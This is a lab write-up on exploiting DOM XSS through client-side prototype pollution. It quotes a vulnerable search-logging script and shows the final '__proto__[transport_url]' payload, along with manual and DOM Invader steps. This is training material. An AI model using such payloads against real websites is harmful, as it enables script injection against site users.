# DOM XSS via client-side prototype pollution
# Objective
This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:

1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
3. Combine these to call `alert()`.

You can solve this lab manually in your browser, or use DOM Invader to help you. 

# Solution
## Analysis
The website logs search requets.

|![](Images/image-10.png)|
|:--:| 
| *Logger request with JSON data* |
|![](Images/image-9.png)|
| *Used scripts - Logger script* |

Source code of `searchLogger.js`:
```js
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }

    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

window.addEventListener("load", searchLogger);
```

## Exploitation
### Manual exploitation
Attacker can deliver exploit by specifying `transport_url` property of `config` - `transport_url` can be used as gadget.

|![](Images/image-11.png)|
|:--:| 
| *Test for prototype pollution* |
|![](Images/image-12.png)|
| *Debugger analysis - transport_url property is potential gadget* |
|![](Images/image-13.png)|
| *Rendered script on page with final payload* |

Final payload:
```
/?__proto__[transport_url]=data:,alert(1);
```


### DOM Invader exploitation

|![](Images/image-14.png)|
|:--:| 
| *DOM Invader - Detected sources* |
|![](Images/image-15.png)|
| *DOM Invader - Scanning for gadgets* |
|![](Images/image-16.png)|
| *DOM Invader - Scan results* |
|![](Images/image-17.png)|
| *DOM Invader - Final exploit* |
